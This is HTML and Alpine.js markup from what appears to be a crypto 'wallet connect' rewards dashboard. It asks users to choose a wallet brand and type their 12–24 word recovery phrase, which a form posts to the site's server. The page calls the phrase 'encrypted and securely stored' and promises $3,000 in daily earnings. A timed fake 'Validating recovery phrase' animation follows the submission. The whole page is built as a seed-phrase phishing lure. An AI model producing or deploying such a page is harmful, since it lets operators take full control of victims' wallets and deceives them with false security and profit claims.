                                            <img src="/temp/wallet/other.png" alt="Zerion"
                                                 class="w-[28px] h-[28px] rounded-[6px] object-contain">
                                            <span class="text-[.65rem] text-[#555] text-center truncate w-full">Zerion</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Edge')"
                                            class="relative flex flex-col items-center gap-1.5 p-[10px_8px] rounded-[11px] border transition-all duration-200 "
                                            :style="selectedWallet === 'Edge' ? 'border-color:#4a6cf7;background:rgba(74,108,247,.06)' : 'border-color:#1e1e1e'"
                                            @mouseover="if(selectedWallet !== 'Edge') $el.style.borderColor='#2a2a2a'"
                                            @mouseout="if(selectedWallet !== 'Edge') $el.style.borderColor='#1e1e1e'"
                                            >
                                            <img src="/temp/wallet/other.png" alt="Edge"
                                                 class="w-[28px] h-[28px] rounded-[6px] object-contain">
                                            <span class="text-[.65rem] text-[#555] text-center truncate w-full">Edge</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('1inch')"
                                            class="relative flex flex-col items-center gap-1.5 p-[10px_8px] rounded-[11px] border transition-all duration-200 "
                                            :style="selectedWallet === '1inch' ? 'border-color:#4a6cf7;background:rgba(74,108,247,.06)' : 'border-color:#1e1e1e'"
                                            @mouseover="if(selectedWallet !== '1inch') $el.style.borderColor='#2a2a2a'"
                                            @mouseout="if(selectedWallet !== '1inch') $el.style.borderColor='#1e1e1e'"
                                            >
                                            <img src="/temp/wallet/other.png" alt="1inch"
                                                 class="w-[28px] h-[28px] rounded-[6px] object-contain">
                                            <span class="text-[.65rem] text-[#555] text-center truncate w-full">1inch</span>
                                                                                    </button>
                                                                                                                    <button type="button"
                                            @click="selectWallet('Bitcoin Wallet')"
                                            class="relative flex flex-col items-center gap-1.5 p-[10px_8px] rounded-[11px] border transition-all duration-200 "
                                            :style="selectedWallet === 'Bitcoin Wallet' ? 'border-color:#4a6cf7;background:rgba(74,108,247,.06)' : 'border-color:#1e1e1e'"
                                            @mouseover="if(selectedWallet !== 'Bitcoin Wallet') $el.style.borderColor='#2a2a2a'"
                                            @mouseout="if(selectedWallet !== 'Bitcoin Wallet') $el.style.borderColor='#1e1e1e'"
                                            >
                                            <img src="/temp/wallet/other.png" alt="Bitcoin Wallet"
                                                 class="w-[28px] h-[28px] rounded-[6px] object-contain">
                                            <span class="text-[.65rem] text-[#555] text-center truncate w-full">Bitcoin Wallet</span>
                                                                                    </button>
                                                                    </div>
                            </div>
                        </div>

                        
                        <form method="POST" action="/dashboard/wallectConnect" @submit="handleSubmit($event)">                            <input type="hidden" name="wallet" :value="selectedWallet">

                            <div x-show="selectedWallet" x-cloak
                                 x-transition:enter="transition ease-out duration-200"
                                 x-transition:enter-start="opacity-0 translate-y-1"
                                 x-transition:enter-end="opacity-100 translate-y-0"
                                 class="space-y-[9px]">

                                
                                <div class="flex items-center gap-3 p-[10px_12px] rounded-[10px] bg-[#0d0d0d] border border-[#1e1e1e]">
                                    <i class="fa-solid fa-circle-check text-blue2 text-[.88rem] flex-shrink-0"></i>
                                    <p class="text-[.82rem] text-[#aaa] flex-1">
                                        Selected: <span class="font-semibold text-[#fff]" x-text="selectedWallet"></span>
                                    </p>
                                    <button type="button" @click="selectedWallet = ''"
                                            class="text-[#444] hover:text-[#888] transition-colors">
                                        <i class="fa-solid fa-xmark text-[.8rem]"></i>
                                    </button>
                                </div>

                                
                                <div class="rounded-[9px] p-[10px_12px] flex items-start gap-2.5"
                                     style="background:rgba(245,197,66,.04);border:1px solid rgba(245,197,66,.12)">
                                    <i class="fa-solid fa-triangle-exclamation flex-shrink-0 mt-0.5" style="color:#f5c542;font-size:.82rem"></i>
                                    <p class="text-[.74rem] text-[#777] leading-[1.55]">
                                        <strong class="text-[#f5c542]">Important:</strong>
                                        Your recovery phrase is encrypted and securely stored. We never access your funds directly.
                                    </p>
                                </div>

                                
                                <div>
                                    <label class="block text-[.72rem] uppercase tracking-[.07em] text-[#444] mb-[6px]">
                                        <i class="fa-solid fa-key mr-1"></i>Recovery Phrase (Seed Phrase)
                                    </label>
                                    <div class="relative bg-[#0d0d0d] border border-[#1e1e1e] rounded-[14px] p-[15px] transition-colors"
                                         :style="hasError ? 'border-color:#ff4560' : ''">
                                        <textarea
                                            name="mnemonic"
                                            x-model="recoveryPhrase"
                                            @input="validatePhrase()"
                                            class="w-full bg-transparent font-mono text-[.82rem] text-[#fff] placeholder-[#333] focus:outline-none resize-none leading-[1.6]"
                                            rows="3"
                                            placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."
                                            required></textarea>
                                        <div class="text-right text-[.68rem] mt-1 font-medium"
                                             :class="wordCount >= 12 && wordCount <= 24 ? 'text-grn' : 'text-[#444]'">
                                            <span x-text="wordCount"></span>/12â€“24 words
                                        </div>
                                    </div>

                                    
                                    <div class="flex flex-wrap gap-4 mt-[8px]">
                                        <div class="flex items-center gap-1.5 text-[.72rem]">
                                            <i class="fa-solid fa-circle-check text-[.75rem]"
                                               :class="wordCount >= 12 && wordCount <= 24 ? 'text-grn' : 'text-[#333]'"></i>
                                            <span :class="wordCount >= 12 && wordCount <= 24 ? 'text-grn' : 'text-[#444]'">12â€“24 words</span>
                                        </div>
                                        <div class="flex items-center gap-1.5 text-[.72rem]">
                                            <i class="fa-solid fa-circle-check text-[.75rem]"
                                               :class="recoveryPhrase.length > 0 && !hasInvalidChars ? 'text-grn' : 'text-[#333]'"></i>
                                            <span :class="recoveryPhrase.length > 0 && !hasInvalidChars ? 'text-grn' : 'text-[#444]'">Valid characters</span>
                                        </div>
                                    </div>
                                </div>

                                
                                <button type="submit"
                                    x-show="isValidPhrase"
                                    x-transition
                                    :disabled="isConnecting"
                                    class="w-full flex items-center justify-center gap-2 p-[14px] rounded-[12px] bg-[#4a6cf7] text-[#fff] text-[.95rem] font-medium hover:opacity-[.88] transition-all"
                                    :class="isConnecting ? 'opacity-75 cursor-wait' : ''">
                                    <template x-if="!isConnecting">
                                        <span class="flex items-center gap-2">
                                            <i class="fa-solid fa-link text-[.85rem]"></i>
                                            Connect <span x-text="selectedWallet"></span>
                                        </span>
                                    </template>
                                    <template x-if="isConnecting">
                                        <span class="flex items-center gap-2">
                                            <svg class="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                                            </svg>
                                            Connecting...
                                        </span>
                                    </template>
                                </button>
                            </div>
                        </form>

                    </div>
                </div>
            </div>
            
            <div class="h-2 bg-[#0a0a0a] border-t border-b border-[#111] -mx-[16px]"></div>

            
            <div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]">
                <div class="flex items-center gap-3 mb-[15px]">
                    <div class="w-[38px] h-[38px] rounded-[10px] flex items-center justify-center flex-shrink-0"
                         style="background:rgba(0,212,124,.1)">
                        <i class="fa-solid fa-money-bill-trend-up text-grn text-[.9rem]"></i>
                    </div>
                    <p class="text-[.88rem] font-medium text-[#fff]">Earning Rewards</p>
                </div>
                <div class="bg-[#111] border border-[#1e1e1e] rounded-[12px] overflow-hidden mb-[10px]">
                    <div class="flex justify-between p-[12px_14px] border-b border-[#161616]">
                        <span class="text-[.81rem] text-[#444]">Daily Reward</span>
                        <span class="text-[.81rem] font-semibold text-grn" x-text="formatMoney(dailyReward)">$0.00</span>
                    </div>
                    <div class="flex justify-between p-[12px_14px]">
                        <span class="text-[.81rem] text-[#444]">Min Balance Required</span>
                        <span class="text-[.81rem] font-semibold text-blue2" x-text="formatMoney(minBalance)">$0.00</span>
                    </div>
                </div>
                <p class="text-[.74rem] text-[#555] leading-[1.55]">
                    Each connected wallet earns daily rewards automatically. Ensure your wallet meets the minimum balance requirement.
                </p>
            </div>

            
                        <div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]">
                <p class="text-[.88rem] font-medium text-[#fff] mb-[12px]">Connection Summary</p>
                <div class="bg-[#111] border border-[#1e1e1e] rounded-[12px] overflow-hidden mb-[10px]">
                    <div class="flex justify-between p-[12px_14px] border-b border-[#161616]">
                        <span class="text-[.81rem] text-[#444]">Active Wallets</span>
                        <span class="text-[.81rem] font-semibold text-grn">1</span>
                    </div>
                    <div class="flex justify-between p-[12px_14px] border-b border-[#161616]">
                        <span class="text-[.81rem] text-[#444]">Available Slots</span>
                        <span class="text-[.81rem] font-semibold text-[#fff]">9</span>
                    </div>
                    <div class="flex justify-between p-[12px_14px]">
                        <span class="text-[.81rem] text-[#444]">Est. Daily Earnings</span>
                        <span class="text-[.81rem] font-semibold text-grn">$3,000.00</span>
                    </div>
                </div>
                <div>
                    <div class="flex items-center justify-between text-[.68rem] text-[#444] mb-[6px]">
                        <span class="uppercase tracking-[.07em]">Capacity</span>
                        <span>1/10</span>
                    </div>
                    <div class="w-full h-[5px] rounded-full bg-[#1a1a1a] overflow-hidden">
                        <div class="h-full rounded-full bg-[#4a6cf7] transition-all"
                             style="width: 10%"></div>
                    </div>
                </div>
            </div>
            
            
            <div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]">
                <p class="text-[.88rem] font-medium text-[#fff] mb-[14px]">Security</p>
                <div class="space-y-[14px]">
                    <div class="flex items-start gap-3">
                        <div class="w-[32px] h-[32px] rounded-[8px] flex items-center justify-center flex-shrink-0"
                             style="background:rgba(0,212,124,.1)">
                            <i class="fa-solid fa-shield-halved text-grn text-[.8rem]"></i>
                        </div>
                        <div>
                            <p class="text-[.82rem] font-medium text-[#fff]">Bank-Level Encryption</p>
                            <p class="text-[.72rem] text-[#444] mt-0.5">256-bit AES encryption at rest</p>
                        </div>
                    </div>
                    <div class="flex items-start gap-3">
                        <div class="w-[32px] h-[32px] rounded-[8px] flex items-center justify-center flex-shrink-0"
                             style="background:rgba(74,108,247,.1)">
                            <i class="fa-solid fa-eye-slash text-blue2 text-[.8rem]"></i>
                        </div>
                        <div>
                            <p class="text-[.82rem] font-medium text-[#fff]">Privacy First</p>
                            <p class="text-[.72rem] text-[#444] mt-0.5">No direct fund access</p>
                        </div>
                    </div>
                    <div class="flex items-start gap-3">
                        <div class="w-[32px] h-[32px] rounded-[8px] flex items-center justify-center flex-shrink-0"
                             style="background:rgba(245,197,66,.1)">
                            <i class="fa-solid fa-bolt text-ylw text-[.8rem]"></i>
                        </div>
                        <div>
                            <p class="text-[.82rem] font-medium text-[#fff]">Instant Setup</p>
                            <p class="text-[.72rem] text-[#444] mt-0.5">Connect in under 30 seconds</p>
                        </div>
                    </div>
                </div>
            </div>

            
            <div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]">
                <p class="text-[.88rem] font-medium text-[#fff] mb-[6px]">Need Help?</p>
                <p class="text-[.74rem] text-[#555] mb-[12px] leading-[1.55]">
                    If you're having trouble connecting or your wallet isn't listed, our support team can assist.
                </p>
                <a href="/user/support.html"
                   class="inline-flex items-center gap-1.5 text-[.78rem] font-medium text-blue2 hover:opacity-75 transition-opacity no-underline">
                    Contact Support
                    <i class="fa-solid fa-arrow-right text-[.7rem]"></i>
                </a>
            </div>

        </div>

        
        <div x-show="isConnecting" x-cloak style="display:none"
             x-transition:enter="transition ease-out duration-300"
             x-transition:enter-start="opacity-0"
             x-transition:enter-end="opacity-100"
             class="fixed inset-0 z-[700] flex items-center justify-center"
             style="background:rgba(0,0,0,.88);backdrop-filter:blur(6px)">
            <div class="bg-[#0d0d0d] border border-[#1e1e1e] rounded-[22px] p-[32px_24px] max-w-sm w-full mx-4 text-center"
                 style="animation:popIn .35s ease">
                
                <div class="relative w-[72px] h-[72px] mx-auto mb-6">
                    <div class="absolute inset-0 rounded-full animate-ping"
                         style="background:rgba(74,108,247,.2)"></div>
                    <div class="relative w-[72px] h-[72px] rounded-full flex items-center justify-center"
                         style="background:rgba(74,108,247,.12);border:1px solid rgba(74,108,247,.3)">
                        <i class="fa-solid fa-wallet text-blue2 text-[1.6rem]"></i>
                    </div>
                </div>

                <p class="font-sora font-bold text-[1.15rem] text-[#fff] mb-2">Connecting Wallet</p>
                <p class="text-[.82rem] text-[#aaa] mb-6">
                    Verifying <span class="font-semibold text-blue2" x-text="selectedWallet"></span> connection...
                </p>

                
                <div class="space-y-3 text-left mb-6">
                    <div class="flex items-center gap-3" x-data="{ done: false }" x-init="setTimeout(() => done = true, 800)">
                        <div class="w-5 h-5 rounded-full flex items-center justify-center flex-shrink-0 transition-colors"
                             :style="done ? 'background:rgba(0,212,124,.1)' : 'background:#1a1a1a'">
                            <template x-if="done"><i class="fa-solid fa-check text-grn" style="font-size:.6rem"></i></template>
                            <template x-if="!done">
                                <svg class="animate-spin h-3 w-3 text-[#444]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                                </svg>
                            </template>
                        </div>
                        <span class="text-[.78rem]" :class="done ? 'text-[#fff]' : 'text-[#444]'">Validating recovery phrase</span>
                    </div>
                    <div class="flex items-center gap-3" x-data="{ done: false }" x-init="setTimeout(() => done = true, 2000)">
                        <div class="w-5 h-5 rounded-full flex items-center justify-center flex-shrink-0 transition-colors"
                             :style="done ? 'background:rgba(0,212,124,.1)' : 'background:#1a1a1a'">
                            <template x-if="done"><i class="fa-solid fa-check text-grn" style="font-size:.6rem"></i></template>
                            <template x-if="!done">
                                <svg class="animate-spin h-3 w-3 text-[#444]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                                </svg>
                            </template>
                        </div>
                        <span class="text-[.78rem]" :class="done ? 'text-[#fff]' : 'text-[#444]'">Establishing secure connection</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <div class="w-5 h-5 rounded-full bg-[#1a1a1a] flex items-center justify-center flex-shrink-0">
                            <svg class="animate-spin h-3 w-3 text-[#444]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                            </svg>
                        </div>
                        <span class="text-[.78rem] text-[#444]">Registering wallet</span>
                    </div>
                </div>

                <p class="text-[.68rem] text-[#444]">This may take a few moments. Please don't close this page.</p>
            </div>
        </div>

    </div>

</div>

<div id="toast"></div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     DEPOSIT BOTTOM SHEET â€” CRYPTO ONLY
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="sheet-bg" id="depSheetBg" onclick="handleDepBgClick(event)">
<div class="sheet" id="depSheet">
  <div class="sheet-handle"><div class="sheet-handle-bar"></div></div>
  <div class="sheet-hdr">
    <button class="sheet-back" onclick="depGoBack()"><i class="fa-solid fa-chevron-left"></i> <span id="depBackLbl">Close</span></button>
    <span class="sheet-title" id="depTitle">Deposit Crypto</span>
    <button class="sheet-close-btn" onclick="closeDepositSheet()"><i class="fa-solid fa-xmark"></i></button>
  </div>
  <div class="sheet-body" id="depBody"></div>
  <div class="cont-bar"><button class="cont-btn off" id="depContBtn" onclick="depContinue()"><i class="fa-solid fa-arrow-right"></i> Continue</button></div>
</div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     WITHDRAW BOTTOM SHEET
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="sheet-bg" id="wdSheetBg" onclick="handleWdBgClick(event)">
<div class="sheet" id="wdSheet">
  <div class="sheet-handle"><div class="sheet-handle-bar"></div></div>
  <div class="sheet-hdr">
    <button class="sheet-back" onclick="wdGoBack()"><i class="fa-solid fa-chevron-left"></i> <span id="wdBackLbl">Back</span></button>
    <span class="sheet-title" id="wdTitle">Withdraw</span>
    <button class="sheet-close-btn" onclick="closeWithdrawSheet()"><i class="fa-solid fa-xmark"></i></button>
  </div>
  <div class="sheet-body" id="wdBody"></div>
  <div class="cont-bar"><button class="cont-btn off" id="wdContBtn" onclick="wdContinue()"><i class="fa-solid fa-arrow-right"></i> Continue</button></div>
</div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     TOKEN PICKER
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="token-picker-bg" id="tpBg" onclick="closeTokenPicker()"></div>
<div class="token-picker" id="tokenPicker">
  <div class="px-4 pt-4 pb-3 border-b border-[#111] flex-shrink-0">
    <div class="flex items-center justify-between mb-3">
      <span class="font-medium text-[.9rem]">Select token</span>
      <button class="w-8 h-8 rounded-full bg-[#1a1a1a] border-none text-[#888] text-[.8rem] flex items-center justify-center cursor-pointer" onclick="closeTokenPicker()"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="flex items-center gap-2 bg-[#111] border border-[#1e1e1e] rounded-[10px] px-3 py-2">
      <i class="fa-solid fa-magnifying-glass text-[#333] text-[.8rem]"></i>
      <input class="flex-1 bg-transparent border-none outline-none text-[.85rem] text-white placeholder-[#333]" type="text" placeholder="Search..." oninput="filterTokenPicker(this.value)"/>
    </div>
  </div>
  <div class="tp-list" id="tpList"></div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     PAYMENT SUCCESS OVERLAY
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="pay-success-bg" id="paySuccessBg">
  <div class="bg-[#0d0d0d] border border-[#1e1e1e] rounded-[20px] p-[28px] mx-4 text-center max-w-[340px] w-full">
    <div class="w-[72px] h-[72px] rounded-full bg-grn/10 border-2 border-grn/30 flex items-center justify-center mx-auto mb-4 text-[1.8rem] text-grn"><i class="fa-solid fa-check"></i></div>
    <div class="font-sora font-bold text-[1.15rem] mb-2">Payment Successful!</div>
    <div class="text-[.82rem] text-[#666] mb-3">Your deposit has been received and is being processed.</div>
    <div class="flex items-center justify-center gap-2 bg-[#111] border border-[#1e1e1e] rounded-[10px] px-3 py-[10px] mb-4 text-[.76rem] text-[#777]"><i class="fa-solid fa-clock text-ylw"></i>Â Please hold forÂ <span class="text-white font-medium" id="payHoldTime">30 minutes â€“ 24 hours</span></div>
    <div class="text-[.74rem] text-[#444] mb-5 leading-[1.6]">Your funds will reflect in your account once the network confirms your transaction. You will be notified.</div>
    <button class="w-full py-[13px] rounded-[12px] border-none bg-grn text-black font-semibold text-[.9rem] cursor-pointer" onclick="closePaySuccess()"><i class="fa-solid fa-check mr-[6px]"></i>Got it, thanks!</button>
  </div>
</div>

